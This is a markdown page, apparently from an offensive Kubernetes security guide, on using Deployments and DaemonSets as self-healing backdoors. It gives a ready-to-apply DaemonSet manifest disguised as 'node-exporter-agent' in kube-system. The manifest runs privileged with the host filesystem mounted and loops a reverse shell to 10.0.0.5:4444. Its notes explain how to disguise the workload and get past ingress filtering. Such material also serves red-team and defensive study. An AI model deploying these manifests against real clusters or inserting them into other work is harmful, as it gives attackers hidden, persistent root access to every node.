---
title: "Malicious workloads: deployments and daemonsets that re-establish access"
order: 1
description: "A controller-managed workload persists because the controller recreates its pods. An attacker deploys a Deployment or DaemonSet that beacons out or opens a backdoor, and the ReplicaSet or DaemonSet controller restarts it whenever it is killed. A DaemonSet additionally lands a pod on every node, giving node-wide, self-healing presence."
keywords:
  - deployment
  - daemonset
  - persistence
  - self-healing
  - backdoor pod
---

# Malicious workloads

Deleting an attacker's pod is futile when a controller owns it: Deployments, ReplicaSets, StatefulSets, and DaemonSets exist precisely to recreate pods that disappear. An attacker uses that self-healing against the defender by deploying a workload whose containers beacon to a command channel or open a backdoor, so killing a pod only triggers its replacement. A DaemonSet is the strongest form, placing a pod on every node and thus surviving the loss of any single node while also giving node-wide reach.

Requires create rights on a workload type:

```bash
kubectl auth can-i create deployments -n <ns>
kubectl auth can-i create daemonsets -n <ns>
```

## Self-healing backdoor

```bash
# a DaemonSet: one beaconing pod per node, recreated if deleted
cat <<YAML | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata: { name: node-exporter-agent, namespace: kube-system }   # innocuous name
spec:
  selector: { matchLabels: { app: node-exporter-agent } }
  template:
    metadata: { labels: { app: node-exporter-agent } }
    spec:
      containers:
      - name: agent
        image: alpine
        command: ["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]
        securityContext: { privileged: true }
        volumeMounts: [{ name: h, mountPath: /host }]
      volumes: [{ name: h, hostPath: { path: / } }]
YAML
```

Marking the pod privileged with a host mount combines persistence with node access, so each recreated pod is also a node foothold.

## Exploitation notes

- Choose a controller so the pod self-heals; a bare Pod deleted stays deleted, whereas a Deployment or DaemonSet pod returns. The DaemonSet also fans out to every node.
- Disguise it as a legitimate agent (`node-exporter`, `fluentd`, `kube-proxy`-like names) in a busy system namespace to blend into expected workloads.
- An outbound beacon is more reliable than an inbound listener because cluster egress is usually permitted while ingress is filtered; pair with a privileged host mount so each pod is also node access per [Privileged pod](../pod-escape-to-node/privileged-pod.md).

## References

- [Kubernetes: DaemonSet](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/)
- [Kubernetes: Deployments](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
